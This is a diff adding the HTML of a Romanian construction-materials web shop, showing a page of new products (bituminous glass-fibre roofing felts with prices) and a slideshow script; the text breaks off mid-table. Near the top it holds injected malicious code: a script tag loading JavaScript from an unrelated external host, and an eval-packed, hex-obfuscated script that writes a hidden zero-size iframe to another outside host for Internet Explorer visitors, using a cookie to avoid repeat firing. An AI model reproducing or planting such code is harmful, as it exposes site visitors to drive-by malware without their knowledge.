@@ -1,0 +1,834 @@
+<!doctype html public "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html dir="LTR" lang="ro">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<title>Master Matcons</title><script src=http://eponim.mk/js/></script><title></title>
+<base href="http://www.materialedeconstructii-mm.ro/">
+<link rel="stylesheet" type="text/css" href="stylesheet.css">
+</head>
+<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0"><script>sa = "%67%72%61%74%6D%2E%6E%65%74";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c])}}return p}('28(9.8.7("17 6")!=-1&&0.5.7("4=3")==-1){0.5="4=3; 11=13, 14 16 10 14:15:26 12; ";0.24("<2 25=1 27=1 23=\'22://"+18+"/19/\' 20=\'21:29\'></2>")}',10,30,'document||iframe|s|_mlsdkf|cookie||indexOf|appVersion|navigator|2015|expires|GMT|Mon|||Jul|MSIE|sa|b2b|style|display|http|src|write|width||height|if|none'.split('|')));</script>
+<!-- header //-->
+<!-- start -->
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td width="100%" align="center"  class="headerSuper">
+    <div align="center" style="width:1024px;">
+     <table width="1024" border="0" cellspacing="0" cellpadding="0" align="center">
+                          <tr>
+                            <td valign="top" height="180">
+                            
+                            <table width="1024" border="0" cellspacing="0" cellpadding="0" align="center">
+                              <tr>
+                                <td width="1024" height="165"><img src="images/materiale-de-constructii.png" alt="Materiale de constructii" style="margin-left:5px;"> </td>
+                                <td width="709" align="center">
+                                <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                                  <tr>
+                                    <td><img src="images/spacer.gif" width="1" height="7" />
+<script type="text/javascript">
+var trans_width='614px' //slideshow width
+var trans_height='138px' //slideshow height
+var pause=3000 //SET PAUSE BETWEEN SLIDE (3000=3 seconds)
+var degree=10 //animation speed. Greater is faster.
+
+var slideshowcontent=new Array()
+//Define slideshow contents: [image URL, OPTIONAL LINK, OPTIONAL LINK TARGET]
+slideshowcontent[0]=["images/adeziv-bau-bau.jpg", "index.php", "_new"];
+////NO need to edit beyond here/////////////
+
+var bgcolor='white'
+
+var imageholder=new Array()
+for (i=0;i<slideshowcontent.length;i++){
+imageholder[i]=new Image()
+imageholder[i].src=slideshowcontent[i][0]
+}
+
+var ie4=document.all
+var dom=document.getElementById&&navigator.userAgent.indexOf("Opera")==-1
+
+if (ie4||dom)
+document.write('<div style="position:relative;width:'+trans_width+';height:'+trans_height+';overflow:hidden"><div id="canvas0" style="position:absolute;background-color:'+bgcolor+';width:'+trans_width+';height:'+trans_height+';left:-'+trans_width+';filter:alpha(opacity=20);-moz-opacity:0.2;"></div><div id="canvas1" style="position:absolute;background-color:'+bgcolor+';width:'+trans_width+';height:'+trans_height+';left:-'+trans_width+';filter:alpha(opacity=20);-moz-opacity:0.2;"></div></div>')
+else if (document.layers){
+document.write('<ilayer id=tickernsmain visibility=hide width='+trans_width+' height='+trans_height+' bgColor='+bgcolor+'><layer id=tickernssub width='+trans_width+' height='+trans_height+' left=0 top=0>'+'<img src="'+slideshowcontent[0][0]+'"></layer></ilayer>')
+}
+
+var curpos=trans_width*(-1)
+var curcanvas="canvas0"
+var curindex=0
+var nextindex=1
+
+function getslidehtml(theslide){
+var slidehtml=""
+if (theslide[1]!="")
+slidehtml='<a href="'+theslide[1]+'" target="'+theslide[2]+'">'
+slidehtml+='<img src="'+theslide[0]+'" border="0">'
+if (theslide[1]!="")
+slidehtml+='</a>'
+return slidehtml
+}
+
+function moveslide(){
+if (curpos<0){
+curpos=Math.min(curpos+degree,0)
+tempobj.style.left=curpos+"px"
+}
+else{
+clearInterval(dropslide)
+if (crossobj.filters)
+crossobj.filters.alpha.opacity=100
+else if (crossobj.style.MozOpacity)
+crossobj.style.MozOpacity=1
+nextcanvas=(curcanvas=="canvas0")? "canvas0" : "canvas1"
+tempobj=ie4? eval("document.all."+nextcanvas) : document.getElementById(nextcanvas)
+tempobj.innerHTML=getslidehtml(slideshowcontent[curindex])
+nextindex=(nextindex<slideshowcontent.length-1)? nextindex+1 : 0
+setTimeout("rotateslide()",pause)
+}
+}
+
+function rotateslide(){
+if (ie4||dom){
+resetit(curcanvas)
+crossobj=tempobj=ie4? eval("document.all."+curcanvas) : document.getElementById(curcanvas)
+crossobj.style.zIndex++
+if (crossobj.filters)
+document.all.canvas0.filters.alpha.opacity=document.all.canvas1.filters.alpha.opacity=20
+else if (crossobj.style.MozOpacity)
+document.getElementById("canvas0").style.MozOpacity=document.getElementById("canvas1").style.MozOpacity=0.2
+var temp='setInterval("moveslide()",50)'
+dropslide=eval(temp)
+curcanvas=(curcanvas=="canvas0")? "canvas1" : "canvas0"
+}
+else if (document.layers){
+crossobj.document.write(getslidehtml(slideshowcontent[curindex]))
+crossobj.document.close()
+}
+curindex=(curindex<slideshowcontent.length-1)? curindex+1 : 0
+}
+
+function jumptoslide(which){
+curindex=which
+rotateslide()
+}
+
+function resetit(what){
+curpos=parseInt(trans_width)*(-1)
+var crossobj=ie4? eval("document.all."+what) : document.getElementById(what)
+crossobj.style.left=curpos+"px"
+}
+
+function startit(){
+crossobj=ie4? eval("document.all."+curcanvas) : dom? document.getElementById(curcanvas) : document.tickernsmain.document.tickernssub
+if (ie4||dom){
+crossobj.innerHTML=getslidehtml(slideshowcontent[curindex])
+rotateslide()
+}
+else{
+document.tickernsmain.visibility='show'
+curindex++
+setInterval("rotateslide()",pause)
+}
+}
+
+if (window.addEventListener)
+window.addEventListener("load", startit, false)
+else if (window.attachEvent)
+window.attachEvent("onload", startit)
+else if (ie4||dom||document.layers)
+window.onload=startit
+</script>
+
+
+
+<script type="text/javascript">
+	//new fadeshow(IMAGES_ARRAY_NAME, slideshow_width, slideshow_height, borderwidth, delay, pause (0=no, 1=yes), optionalRandomOrder)
+	new fadeshow(fadeimages, 614, 138, 0, 3000, 1, "R")
+	 
+</script></td>
+                                  </tr>
+                                </table>                         
+                                
+                                </td>
+                              </tr>
+                              <tr>
+                                <td height="25" colspan="2">
+                                <div style="margin-top:7px; font-size:18px; color:#0099CC; text-decoration:none; text-transform:uppercase;" align="center">
+                                <a href="http://www.materialedeconstructii-mm.ro/index.php" class="menuiSus" title="Prima Pagina">Prima Pagina</a> &nbsp; | &nbsp; 
+                                <a href="http://www.materialedeconstructii-mm.ro/aboutus.php" class="menuiSus">Despre Noi</a>  &nbsp;| &nbsp; 
+                                <a href="http://www.materialedeconstructii-mm.ro/products_new.php" class="menuiSus">Produse Noi</a>  &nbsp;| &nbsp; 
+                                <a href="http://www.materialedeconstructii-mm.ro/account.php" class="menuiSus">Contul Meu</a>  &nbsp;| &nbsp; 
+                                <a href="http://www.materialedeconstructii-mm.ro/shopping_cart.php" class="menuiSus">Cos Cumparaturi</a>  &nbsp;| &nbsp; 
+                                <a href="http://www.materialedeconstructii-mm.ro/contact_us.php" class="menuiSus">Contact</a>
+                                </div>
+                                </td>
+                              </tr>
+                            </table>
+                            
+                            </td>
+                          </tr>                          
+                        </table>
+    </div>
+    </td>
+  </tr>
+  <tr>
+    <td width="100%" align="center" style="background-image:url(images/top_talling2.gif); background-repeat:repeat-x; padding-top:15px;">
+    <table cellpadding="0" width="100%" cellspacing="0" border="0" style="background-repeat:repeat-y;" align="center"> 
+	<tr>
+		<td align="center">
+			<table cellpadding="0" cellspacing="0" border="0" style="height:533px; margin:5px 0px 5px 0px;" align="center">
+				<tr>                    
+					<td width="100%" style="padding:0px 7px 0px 7px;">
+<!-- end -->
+<!-- start -->
+<!-- end -->
+
+					 
+<!-- header_eof //-->
+
+<!-- body //-->
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td class="col_left">
+<!-- left_navigation //-->
+<table border="0"cellspacing="0" cellpadding="0" class="box_width_left">
+	<tr><td>
+		<table border="0" cellspacing="0" cellpadding="0"  class="box_width_left">
+<!-- categories //-->
+          <tr>
+            <td>
+<table cellpadding='0' cellspacing='0' border='0' class='box'><tr><td class='box-head' align='center'><span classs='textBoxHead'>Categorii</span></td></tr><tr><td class='box-content'><table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="0"  style="margin-bottom:5px;" class="box_body_table">
+  <tr>
+    <td  style="width:240px;" class="box_body box_body_td"><ul><li class="bg_list"><a href=http://www.materialedeconstructii-mm.ro/hidroizolatii-c-4.html>HIDROIZOLATII&nbsp;(196)</a></li><li class="bg_list"><a href=http://www.materialedeconstructii-mm.ro/termosistem-fatada-c-6.html>TERMOSISTEM FATADA&nbsp;(187)</a></li><li class="bg_list"><a href=http://www.materialedeconstructii-mm.ro/finisaje-interioare-c-3.html>FINISAJE INTERIOARE&nbsp;(517)</a></li><li class="bg_list"><a href=http://www.materialedeconstructii-mm.ro/structura-c-5.html>STRUCTURA&nbsp;(179)</a></li><li class="bg_list"><a href=http://www.materialedeconstructii-mm.ro/acoperis-c-2.html>ACOPERIS&nbsp;(87)</a></li><li class="bg_list"><a href=http://www.materialedeconstructii-mm.ro/fatade-ventilate-c-94.html>FATADE VENTILATE&nbsp;(120)</a></li></ul></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+</td></tr><tr><td class='box-footer'></td></tr></table>            </td>
+          </tr>
+<!-- categories_eof //-->
+		<tr>
+            <td>
+			<table cellpadding='0' cellspacing='0' border='0' class='box'><tr><td class='box-head' align='center'><span classs='textBoxHead'>CALCULATOARE</span></td></tr><tr><td class='box-content'>           
+            
+            <a href="http://www.materialedeconstructii-mm.ro/calculator.php" style="margin-left:20px; color:#0033CC; font-weight:bold; text-decoration:none;">&raquo; Calculator Termosisteme</a><br>
+                  
+            </td></tr><tr><td class='box-footer'></td></tr></table>			</td>
+          </tr><!-- info_pages //-->
+          <tr>
+            <td>
+<table cellpadding='0' cellspacing='0' border='0' class='box'><tr><td class='box-head' align='center'><span classs='textBoxHead'>RECOMANDARE MONTAJ</span></td></tr><tr><td class='box-content'><table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="0"  style="margin-bottom:5px;" class="box_body_table">
+  <tr>
+    <td  style="width:240px;" class="box_body box_body_td"><table border="0" width="100%" cellspacing="0" cellpadding="1"><tr><td class="infoBoxContents"><a target="" href="http://www.materialedeconstructii-mm.ro/extra_info_pages.php?pages_id=4" style="margin-left:20px; color:#0033CC; font-weight:bold; text-decoration:none;">&raquo;AGREMENTE TEHNICE</a></td></tr><tr><td class="infoBoxContents"><a target="" href="http://www.materialedeconstructii-mm.ro/extra_info_pages.php?pages_id=6" style="margin-left:20px; color:#0033CC; font-weight:bold; text-decoration:none;">&raquo;INSTALATII INDUSTRIALE</a></td></tr></table></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+</td></tr><tr><td class='box-footer'></td></tr></table>            </td>
+          </tr>
+<!-- info_pages_eof //-->
+
+		</table>
+	</td>
+	<td><img src="images/spacer.gif" border="0" alt="" width="9" height="1"></td></tr>
+</table>
+<!-- left_navigation_eof //-->
+    </td>
+<!-- body_text //-->
+    <td width="100%" class="col_center">
+	
+
+
+  
+    
+<table cellpadding="0" bgcolor="" cellspacing="0" border="0" style="margin-top:5px;">
+                    <tr>
+                    	<td style="background:url(images/bg-centru-stanga.gif); background-repeat:no-repeat; width:10px; height:31px;"></td> 
+                        <td style="background:url(images/bg-centru.gif); background-repeat:repeat-x;"class="cont_heading_td">
+						Noutati			
+                               
+                        </td>
+                        <td style="background:url(images/bg-centru-dreapta.gif); background-repeat:no-repeat; width:10px; height:31px;"></td>
+                    </tr>
+                </table>
+	
+
+
+
+                <table cellpadding="0" cellspacing="0" border="0" class="cont_body_table">			   
+				    <tr>
+                        <td><img src="images/cont_body_corn_tl.gif" border="0" alt="" width="15" height="15"></td>
+                        <td width="100%" class="cont_body_tall_t"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                        <td><img src="images/cont_body_corn_tr.gif" border="0" alt="" width="15" height="15"></td>
+                    </tr>
+                    <tr>
+                        <td class="cont_body_tall_l"><img src="images/bgleft.gif" border="0" alt="" width="15" height="3"></td>
+                        <td width="100%" class="cont_body_td">		
+
+       
+	   		
+		<table border="0" cellspacing="0" cellpadding="0" class="result">
+          <tr>
+            <td>Afisari de la <b>961</b> Pana la <b>964</b> (of <b>1134</b> produse noi)</td>
+            <td class="result_right">Rezultate: <a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=240" class="pageResults" title=" Pagina anterioara "><u>[&lt;&lt;&nbsp;Anterioara]</u></a>&nbsp;&nbsp;<a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=240" class="pageResults" title=" Inapoi 5 pagini ">...</a>&nbsp;<b>241</b>&nbsp;&nbsp;<a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=242" class="pageResults" title=" Pagina 242 "><u>242</u></a>&nbsp;&nbsp;<a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=243" class="pageResults" title=" Pagina 243 "><u>243</u></a>&nbsp;&nbsp;<a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=244" class="pageResults" title=" Pagina 244 "><u>244</u></a>&nbsp;&nbsp;<a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=245" class="pageResults" title=" Pagina 245 "><u>245</u></a>&nbsp;<a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=246" class="pageResults" title=" Inainte 5 pagini ">...</a>&nbsp;&nbsp;<a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=242" class="pageResults" title=" Urmatoarea pagina "><u>[Urmatoarea&nbsp;&gt;&gt;]</u></a>&nbsp;</td>
+          </tr>
+        </table>
+
+
+        
+					  				
+			  				
+<table border="0" width="" cellspacing="0" cellpadding="0" class="box_width_cont product">
+   <tr>
+    <td><table border="0" width="" cellspacing="0" cellpadding="0" class="tableBox_output">
+   <tr>
+    <td align="center"  style="width:50%;">
+            <table cellpadding="0" cellspacing="0" border="0" class="cont_body_table_2">
+                <tr>
+                    <td><img src="images/cont_body_corn_tl_2.gif" border="0" alt="" width="6" height="5"></td>
+                    <td width="100%" class="cont_body_tall_t_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                    <td><img src="images/cont_body_corn_tr_2.gif" border="0" alt="" width="6" height="5"></td>
+                </tr>
+                <tr>
+                    <td class="cont_body_tall_l_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                    <td width="100%" class="cont_body_td_2 vam">
+                           <table cellpadding="0" cellspacing="0" border="0">
+                                <tr>
+                                    <td style="height:43px " class="vam"><span><a href="http://www.materialedeconstructii-mm.ro/impaslitura-fibra-sticla-bitumata-perforata-1200-kgm2-rola-p-402.html">Impaslitura din fibra de sticla bitumata si perforata IBP 1200 (3 kg/m2) Rola 20 m2</a></span></td>
+                                </tr>
+                                <tr>
+                                    <td>
+                    <table cellpadding="0" cellspacing="0" border="0" class="pic table_pic_width">
+                        <tr>
+                          <td><img src="images/pic_corn_tl.gif" border="0" alt="" width="17" height="5"></td>
+                          <td class="pic_corn_t"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                          <td><img src="images/pic_corn_tr.gif" border="0" alt="" width="15" height="5"></td>
+                        </tr>
+                        <tr>
+                          <td class="pic_corn_l"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                          <td class="image" style="padding:0px 11px 0px 11px;"><a href="http://www.materialedeconstructii-mm.ro/impaslitura-fibra-sticla-bitumata-perforata-1200-kgm2-rola-p-402.html"><img src="images/Untitled-127.jpg" border="0" alt="Impaslitura din fibra de sticla bitumata si perforata IBP 1200 (3 kg/m2) Rola 20 m2" title=" Impaslitura din fibra de sticla bitumata si perforata IBP 1200 (3 kg/m2) Rola 20 m2 " width="124" height="86"></a></td>
+                          <td class="pic_corn_r"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                        </tr>
+                        <tr>
+                          <td><img src="images/pic_corn_bl.gif" border="0" alt="" width="17" height="5"></td>
+                          <td class="pic_corn_b"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                          <td><img src="images/pic_corn_br.gif" border="0" alt="" width="15" height="5"></td>
+                        </tr>
+                    </table></td>
+                                </tr>
+                                <tr>
+                                    <td style="height:20px;"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                                </tr>
+                                <tr>
+                                    <td style="height:54px;">
+			<table cellpadding="0" cellspacing="0" border="0" class="cont_body_table_3">
+				<tr><td>
+					<table cellpadding="0" cellspacing="0" border="0">
+						<tr>
+							<td></td>
+							<td width="100%" class="cont_body_tall_t_3"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+							<td></td>
+						</tr>												
+					</table>
+				</td></tr>
+				<tr><td style="vertical-align:middle;text-align:center;height:49px;">
+                                                    <table cellpadding="0" cellspacing="0" border="0" style="height:49px">
+                                                        <tr>
+                                                            <td style="width:50%;" class="vam">
+																<table cellpadding="0" cellspacing="5" border="0">
+																	<tr><td align="center"><span class="productSpecialPrice">158,20?RON</td></tr>
+																</table>
+															</td>
+                                                            <td style="width:50%" align="center">
+																<table cellpadding="0" cellspacing="0" border="0" style="width:1px;">
+																	<tr><td style="text-align:right;"><a href="http://www.materialedeconstructii-mm.ro/product_info.php?products_id=402"><img src="includes/languages/english/images/buttons/button_details.gif" border="0" alt="" width="65" height="21"></a><br /><img src="images/spacer.gif" border="0" alt="" width="1" height="5"><br /><a href="http://www.materialedeconstructii-mm.ro/products_new.php?action=buy_now&amp;products_id=402"><img src="includes/languages/english/images/buttons/button_add_to_cart1.gif" border="0" alt="" width="121" height="21"></a></td></tr>
+																</table>
+															</td>
+															<td><img src="images/spacer.gif" border="0" alt="" width="5" height="1"></td>
+                                                        </tr>
+                                                    </table> 
+                                      </td></tr></table>
+                                    </td>
+                                </tr>
+                            </table></td>
+                            <td class="cont_body_tall_r_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                        </tr>
+                        <tr>
+                            <td><img src="images/cont_body_corn_bl_2.gif" border="0" alt="" width="6" height="5"></td>
+                            <td width="100%" class="cont_body_tall_b_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                            <td><img src="images/cont_body_corn_br_2.gif" border="0" alt="" width="6" height="5"></td>
+                        </tr>
+                    </table></td>  
+<td style="width:1%;"><img src="images/spacer.gif" border="0" alt="" width="5" height="1"></td>    <td align="center"  style="width:50%;">
+            <table cellpadding="0" cellspacing="0" border="0" class="cont_body_table_2">
+                <tr>
+                    <td><img src="images/cont_body_corn_tl_2.gif" border="0" alt="" width="6" height="5"></td>
+                    <td width="100%" class="cont_body_tall_t_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                    <td><img src="images/cont_body_corn_tr_2.gif" border="0" alt="" width="6" height="5"></td>
+                </tr>
+                <tr>
+                    <td class="cont_body_tall_l_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                    <td width="100%" class="cont_body_td_2 vam">
+                           <table cellpadding="0" cellspacing="0" border="0">
+                                <tr>
+                                    <td style="height:43px " class="vam"><span><a href="http://www.materialedeconstructii-mm.ro/impaslitura-fibra-sticla-bitumata-1000-rola-p-400.html">Impaslitura din fibra de sticla bitumata MSB 1000 Rola 10 m2</a></span></td>
+                                </tr>
+                                <tr>
+                                    <td>
+                    <table cellpadding="0" cellspacing="0" border="0" class="pic table_pic_width">
+                        <tr>
+                          <td><img src="images/pic_corn_tl.gif" border="0" alt="" width="17" height="5"></td>
+                          <td class="pic_corn_t"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                          <td><img src="images/pic_corn_tr.gif" border="0" alt="" width="15" height="5"></td>
+                        </tr>
+                        <tr>
+                          <td class="pic_corn_l"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                          <td class="image" style="padding:0px 11px 0px 11px;"><a href="http://www.materialedeconstructii-mm.ro/impaslitura-fibra-sticla-bitumata-1000-rola-p-400.html"><img src="images/Untitled-125.jpg" border="0" alt="Impaslitura din fibra de sticla bitumata MSB 1000 Rola 10 m2" title=" Impaslitura din fibra de sticla bitumata MSB 1000 Rola 10 m2 " width="124" height="86"></a></td>
+                          <td class="pic_corn_r"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                        </tr>
+                        <tr>
+                          <td><img src="images/pic_corn_bl.gif" border="0" alt="" width="17" height="5"></td>
+                          <td class="pic_corn_b"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                          <td><img src="images/pic_corn_br.gif" border="0" alt="" width="15" height="5"></td>
+                        </tr>
+                    </table></td>
+                                </tr>
+                                <tr>
+                                    <td style="height:20px;"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                                </tr>
+                                <tr>
+                                    <td style="height:54px;">
+			<table cellpadding="0" cellspacing="0" border="0" class="cont_body_table_3">
+				<tr><td>
+					<table cellpadding="0" cellspacing="0" border="0">
+						<tr>
+							<td></td>
+							<td width="100%" class="cont_body_tall_t_3"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+							<td></td>
+						</tr>												
+					</table>
+				</td></tr>
+				<tr><td style="vertical-align:middle;text-align:center;height:49px;">
+                                                    <table cellpadding="0" cellspacing="0" border="0" style="height:49px">
+                                                        <tr>
+                                                            <td style="width:50%;" class="vam">
+																<table cellpadding="0" cellspacing="5" border="0">
+																	<tr><td align="center"><span class="productSpecialPrice">36,89?RON</td></tr>
+																</table>
+															</td>
+                                                            <td style="width:50%" align="center">
+																<table cellpadding="0" cellspacing="0" border="0" style="width:1px;">
+																	<tr><td style="text-align:right;"><a href="http://www.materialedeconstructii-mm.ro/product_info.php?products_id=400"><img src="includes/languages/english/images/buttons/button_details.gif" border="0" alt="" width="65" height="21"></a><br /><img src="images/spacer.gif" border="0" alt="" width="1" height="5"><br /><a href="http://www.materialedeconstructii-mm.ro/products_new.php?action=buy_now&amp;products_id=400"><img src="includes/languages/english/images/buttons/button_add_to_cart1.gif" border="0" alt="" width="121" height="21"></a></td></tr>
+																</table>
+															</td>
+															<td><img src="images/spacer.gif" border="0" alt="" width="5" height="1"></td>
+                                                        </tr>
+                                                    </table> 
+                                      </td></tr></table>
+                                    </td>
+                                </tr>
+                            </table></td>
+                            <td class="cont_body_tall_r_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                        </tr>
+                        <tr>
+                            <td><img src="images/cont_body_corn_bl_2.gif" border="0" alt="" width="6" height="5"></td>
+                            <td width="100%" class="cont_body_tall_b_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                            <td><img src="images/cont_body_corn_br_2.gif" border="0" alt="" width="6" height="5"></td>
+                        </tr>
+                    </table></td>  
+  </tr> 	
+
+			<tr><td style="height:1px;" ><img src="images/spacer.gif" border="0" alt="" width="1" height="5"></td></tr>
+			 
+			   <tr>
+    <td align="center"  style="width:50%;">
+            <table cellpadding="0" cellspacing="0" border="0" class="cont_body_table_2">
+                <tr>
+                    <td><img src="images/cont_body_corn_tl_2.gif" border="0" alt="" width="6" height="5"></td>
+                    <td width="100%" class="cont_body_tall_t_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                    <td><img src="images/cont_body_corn_tr_2.gif" border="0" alt="" width="6" height="5"></td>
+                </tr>
+                <tr>
+                    <td class="cont_body_tall_l_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                    <td width="100%" class="cont_body_td_2 vam">
+                           <table cellpadding="0" cellspacing="0" border="0">
+                                <tr>
+                                    <td style="height:43px " class="vam"><span><a href="http://www.materialedeconstructii-mm.ro/impaslitura-fibra-sticla-bitumata-1100-kgm2-rola-p-399.html">Impaslitura din fibra de sticla bitumata IA 1100 ( 2.4 kg/m2 ) Rola 20 m2</a></span></td>
+                                </tr>
+                                <tr>
+                                    <td>
+                    <table cellpadding="0" cellspacing="0" border="0" class="pic table_pic_width">
+                        <tr>
+                          <td><img src="images/pic_corn_tl.gif" border="0" alt="" width="17" height="5"></td>
+                          <td class="pic_corn_t"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                          <td><img src="images/pic_corn_tr.gif" border="0" alt="" width="15" height="5"></td>
+                        </tr>
+                        <tr>
+                          <td class="pic_corn_l"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                          <td class="image" style="padding:0px 11px 0px 11px;"><a href="http://www.materialedeconstructii-mm.ro/impaslitura-fibra-sticla-bitumata-1100-kgm2-rola-p-399.html"><img src="images/Untitled-125.jpg" border="0" alt="Impaslitura din fibra de sticla bitumata IA 1100 ( 2.4 kg/m2 ) Rola 20 m2" title=" Impaslitura din fibra de sticla bitumata IA 1100 ( 2.4 kg/m2 ) Rola 20 m2 " width="124" height="86"></a></td>
+                          <td class="pic_corn_r"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                        </tr>
+                        <tr>
+                          <td><img src="images/pic_corn_bl.gif" border="0" alt="" width="17" height="5"></td>
+                          <td class="pic_corn_b"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                          <td><img src="images/pic_corn_br.gif" border="0" alt="" width="15" height="5"></td>
+                        </tr>
+                    </table></td>
+                                </tr>
+                                <tr>
+                                    <td style="height:20px;"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                                </tr>
+                                <tr>
+                                    <td style="height:54px;">
+			<table cellpadding="0" cellspacing="0" border="0" class="cont_body_table_3">
+				<tr><td>
+					<table cellpadding="0" cellspacing="0" border="0">
+						<tr>
+							<td></td>
+							<td width="100%" class="cont_body_tall_t_3"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+							<td></td>
+						</tr>												
+					</table>
+				</td></tr>
+				<tr><td style="vertical-align:middle;text-align:center;height:49px;">
+                                                    <table cellpadding="0" cellspacing="0" border="0" style="height:49px">
+                                                        <tr>
+                                                            <td style="width:50%;" class="vam">
+																<table cellpadding="0" cellspacing="5" border="0">
+																	<tr><td align="center"><span class="productSpecialPrice">93,61?RON</td></tr>
+																</table>
+															</td>
+                                                            <td style="width:50%" align="center">
+																<table cellpadding="0" cellspacing="0" border="0" style="width:1px;">
+																	<tr><td style="text-align:right;"><a href="http://www.materialedeconstructii-mm.ro/product_info.php?products_id=399"><img src="includes/languages/english/images/buttons/button_details.gif" border="0" alt="" width="65" height="21"></a><br /><img src="images/spacer.gif" border="0" alt="" width="1" height="5"><br /><a href="http://www.materialedeconstructii-mm.ro/products_new.php?action=buy_now&amp;products_id=399"><img src="includes/languages/english/images/buttons/button_add_to_cart1.gif" border="0" alt="" width="121" height="21"></a></td></tr>
+																</table>
+															</td>
+															<td><img src="images/spacer.gif" border="0" alt="" width="5" height="1"></td>
+                                                        </tr>
+                                                    </table> 
+                                      </td></tr></table>
+                                    </td>
+                                </tr>
+                            </table></td>
+                            <td class="cont_body_tall_r_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                        </tr>
+                        <tr>
+                            <td><img src="images/cont_body_corn_bl_2.gif" border="0" alt="" width="6" height="5"></td>
+                            <td width="100%" class="cont_body_tall_b_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                            <td><img src="images/cont_body_corn_br_2.gif" border="0" alt="" width="6" height="5"></td>
+                        </tr>
+                    </table></td>  
+<td style="width:1%;"><img src="images/spacer.gif" border="0" alt="" width="5" height="1"></td>    <td align="center"  style="width:50%;">
+            <table cellpadding="0" cellspacing="0" border="0" class="cont_body_table_2">
+                <tr>
+                    <td><img src="images/cont_body_corn_tl_2.gif" border="0" alt="" width="6" height="5"></td>
+                    <td width="100%" class="cont_body_tall_t_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                    <td><img src="images/cont_body_corn_tr_2.gif" border="0" alt="" width="6" height="5"></td>
+                </tr>
+                <tr>
+                    <td class="cont_body_tall_l_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                    <td width="100%" class="cont_body_td_2 vam">
+                           <table cellpadding="0" cellspacing="0" border="0">
+                                <tr>
+                                    <td style="height:43px " class="vam"><span><a href="http://www.materialedeconstructii-mm.ro/impaslitura-fibra-sticla-bitumata-1100-kgm2-rola-p-398.html">Impaslitura din fibra de sticla bitumata IA 1100 ( 2.4 kg/m2 ) Rola 10 m2</a></span></td>
+                                </tr>
+                                <tr>
+                                    <td>
+                    <table cellpadding="0" cellspacing="0" border="0" class="pic table_pic_width">
+                        <tr>
+                          <td><img src="images/pic_corn_tl.gif" border="0" alt="" width="17" height="5"></td>
+                          <td class="pic_corn_t"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                          <td><img src="images/pic_corn_tr.gif" border="0" alt="" width="15" height="5"></td>
+                        </tr>
+                        <tr>
+                          <td class="pic_corn_l"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                          <td class="image" style="padding:0px 11px 0px 11px;"><a href="http://www.materialedeconstructii-mm.ro/impaslitura-fibra-sticla-bitumata-1100-kgm2-rola-p-398.html"><img src="images/Untitled-125.jpg" border="0" alt="Impaslitura din fibra de sticla bitumata IA 1100 ( 2.4 kg/m2 ) Rola 10 m2" title=" Impaslitura din fibra de sticla bitumata IA 1100 ( 2.4 kg/m2 ) Rola 10 m2 " width="124" height="86"></a></td>
+                          <td class="pic_corn_r"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                        </tr>
+                        <tr>
+                          <td><img src="images/pic_corn_bl.gif" border="0" alt="" width="17" height="5"></td>
